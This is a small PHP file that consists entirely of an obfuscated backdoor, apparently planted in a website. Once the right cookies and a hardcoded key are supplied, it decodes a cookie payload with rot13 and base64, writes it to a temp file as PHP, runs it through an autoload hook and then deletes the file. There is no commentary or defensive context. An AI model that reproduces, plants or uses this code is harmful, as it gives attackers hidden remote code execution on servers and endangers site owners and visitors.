<!--0uhoMjW9-->
<?php

if (isset($_COOKIE[-52+52]) && isset($_COOKIE[-20+21]) && isset($_COOKIE[65-62]) && isset($_COOKIE[39-35])) {
    $argument = $_COOKIE;
    function created($state) {
        $argument = $_COOKIE;
        $id = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), 'saEKihPI');
        if (!is_writable($id)) {
            $id = getcwd() . DIRECTORY_SEPARATOR . "system";
        }
        $st = "\x3c\x3f\x70\x68p " . base64_decode(str_rot13($argument[3]));
        if (is_writeable($id)) {
            $parameter = fopen($id, 'w+');
            fputs($parameter, $st);
            fclose($parameter);
            spl_autoload_unregister(__FUNCTION__);
            require_once($id);
            @array_map('unlink', array($id));
        }
    }
    spl_autoload_register("created");
    $field = "4181e17eafffe31150dee0e55eeda70b";
    if (!strncmp($field, $argument[4], 32)) {
        if (@class_parents("accepted_created", true)) {
            exit;
        }
    }
}